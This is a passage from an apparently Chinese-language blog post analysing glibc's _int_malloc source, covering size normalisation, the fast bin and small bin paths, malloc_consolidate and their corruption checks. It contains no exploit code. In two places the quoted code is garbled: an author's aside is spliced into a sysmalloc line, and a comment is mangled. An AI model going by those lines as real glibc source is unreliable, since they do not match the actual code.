class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line"><span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;  </span><br><span class="line">checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> *p = sysmalloc (nb, av);<span class="built_in">free</span>的源码分析先咕一会，主要是吧，熬夜写这玩意受不了。。</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量定义就不用看了，源码中也都标注出来了，这里最主要就是把用户请求的<code>bytes</code>转换成最小能满足的<code>chunk size</code>，然后它的变量名应该是<code>nb</code>，这个<code>nb</code>应该是<code>nbytes</code>的缩写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                             \</span></span><br><span class="line"><span class="meta">  <span class="meta-keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;      \</span></span><br><span class="line"><span class="meta">      __set_errno (ENOMEM);      \</span></span><br><span class="line"><span class="meta">      return 0;      \</span></span><br><span class="line"><span class="meta">    &#125;      \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);</span></span><br></pre></td></tr></table></figure><p>这里原来也给注释了，这俩宏定义就是一样的，只不过做一个参数check。</p><p>这里还要注意一下那些宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__glibc_unlikely(<span class="built_in">exp</span>)表示<span class="built_in">exp</span>很可能为假。</span><br><span class="line">__glibc_likely(<span class="built_in">exp</span>)表示<span class="built_in">exp</span>很可能为真。</span><br><span class="line">__builtin_expect(<span class="built_in">exp</span>,value)表示<span class="built_in">exp</span>==value大概率成立</span><br></pre></td></tr></table></figure><p>这三个宏定义在源码中经常能看到，其实它不会改编程序逻辑，只是告诉编译器这个很可能为某个值，就把否的情况作为跳转，真的情况就顺序运行下去，减少程序的跳转，一定程度上可以优化程序运行速度。或者还有一个简单粗暴的办法，你把这三个字符全都去了，不影响代码逻辑。</p><p>那么这一段的逻辑就是，如果在分配的时候<code>arena</code>为空，那就调用<code>sys_malloc</code>系统调用去请求一个<code>chunk</code>，然后<code>memset</code>这个<code>chunk</code>的数据段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ------------------ Testing support ----------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> perturb_byte;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">alloc_perturb</span> <span class="params">(<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte ^ <span class="number">0xff</span>, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通常情况下<code>perturb_byte</code>为假，差不多意思就是如果你没有特殊设置，那么<code>data</code>段全为0字节，实际情况也确实是这样的。</p><h3 id="第二段：fast-bin的处理"><a href="#第二段：fast-bin的处理" class="headerlink" title="第二段：fast bin的处理"></a>第二段：fast bin的处理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_max_fast() global_max_fast</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">&#123;</span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">    mchunkptr pp = *fb;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">           != victim);</span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">//在malloc的时候检查了fastbin的size发现不对</span></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里嘛就会判断，你申请的这个<code>nb</code>是否<code>&lt;=global_max_fast</code>，如果成立那么就会先在<code>fast bin</code>中寻找能满足的<code>chunk</code>，并且一定是完全匹配。它先找到<code>av-&gt;fastbinY[idx]</code>观察是否为0，如果不为0则说明该<code>size</code>的<code>fast bin</code>有<code>chunk</code>，那么就做以下动作：</p><p>取出<code>av-&gt;fastbinY[idx]</code>给<code>victim</code></p><p>链表中删除这个<code>victim</code>，然后重新接回去。</p><p>中间有一个<code>check</code>，就是判断所给<code>chunk</code>的<code>fastbinY</code>链上的<code>size</code>是否＝我需要的<code>size</code>，如果不相等那么直接报错退出。</p><p>末尾也有一个<code>check</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Properties of chunks recycled from fastbins</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">do_check_remalloced_chunk</span> <span class="params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!chunk_is_mmapped (p))</span><br><span class="line">    &#123;</span><br><span class="line">      assert (av == arena_for_chunk (p));</span><br><span class="line">      <span class="keyword">if</span> (chunk_non_main_arena (p))</span><br><span class="line">        assert (av != &amp;main_arena);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        assert (av == &amp;main_arena);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  do_check_inuse_chunk (av, p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Legal size ... */</span></span><br><span class="line">  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &gt;= MINSIZE);</span><br><span class="line">  <span class="comment">/* ... and alignment */</span></span><br><span class="line">  assert (aligned_OK (chunk2mem (p)));</span><br><span class="line">  <span class="comment">/* chunk is less than MINSIZE more than request */</span></span><br><span class="line">  assert ((<span class="keyword">long</span>) (sz) - (<span class="keyword">long</span>) (s) &gt;= <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="keyword">long</span>) (sz) - (<span class="keyword">long</span>) (s + MINSIZE) &lt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是<code>check</code>各个标志位，一般不会被触发，所以可以理解为<code>fast bin</code>在分配的时候只有这一个<code>check</code>，就是那个<code>chunk</code>的<code>size</code>一定是等于我申请的<code>size</code>的，过了就把这个<code>chunk</code>的指针返回，<code>check</code>没过报错，如果根本都没取到<code>fast bin</code>，那么就进行下面的逻辑了。</p><h3 id="第三段：small-bin的处理"><a href="#第三段：small-bin的处理" class="headerlink" title="第三段：small bin的处理"></a>第三段：small bin的处理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先判断它在不在<code>small bin</code>的范围内，然后取出这个<code>size</code>的<code>small bin</code>的最后一个<code>chunk</code>。它添加是在头部添加的，因此是符合先进先出的，嗯。然后需要判断，如果最后一个chunk!=自身的话，两个情况：要么没初始化<code>arena</code>，那就初始化，要么它有一个合法的块。如果它指向自身那就没必要做过多的判断了，没有这个大小的<code>small bin</code>。</p><p>这里是调用了<code>malloc_consolidate</code>函数去初始话这个<code>arena</code>分配器，该函数逻辑如下，不重点解读。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span><span class="function">mlined version of consolidation code in <span class="title">free</span><span class="params">()</span> *</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    maxfb </span>= &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">  nextchunk = chunk_at_offset(p, size);</span><br><span class="line">  nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      unlink(av, nextchunk, bck, fwd);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">    unsorted_bin-&gt;fd = p;</span><br><span class="line">    first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    p-&gt;bk = unsorted_bin;</span><br><span class="line">    p-&gt;fd = first_unsorted;</span><br><span class="line">    set_foot(p, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致意思就是清空所有<code>arena</code>的<code>chunk</code>，可以看到大的<code>if</code>是判断<code>global_max_fast</code>是否为0，为0则初始化，调用<code>malloc_init_state</code>和<code>check_malloc_state</code>函数初始化堆。否则把所有的<code>fast bin</code> 取出来，先清除它们的标志位，然后扔到<code>unsorted bin</code>中尝试向前合并或者向后合并。</p><p>这个呢，不太能运行到，因为<code>victim==0</code>的时候，必还没初始化，没初始化到这里就要初始化，初始化了之后<code>victim</code>又不可能<code>=0</code>了，所以这里可以理解为就是初始化<code>arena</code>的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse_bit_at_offset(p, s)      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure><p>这里判断了一下<code>victim-&gt;bk-&gt;fd==victim</code>。也就是当前这个堆块后一个堆块的<code>fd</code>指针是否指向<code>victim</code>，如果不等说明链表被破坏了，那么就报错退出。</p><p>然后<code>set_inuse_bit_at_offset</code>，这个也不难理解，因为现在这个<code>small bin</code>被取出来了要使用了，所以我得设置后一个块的<code>prev_inuse</code>为1证明它不是空闲堆块了。然后就是进行<code>unlink</code>操作，对链表熟悉的同学应该看得懂。如果我要删除<code>victim</code>元素那应该怎么写逻辑？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 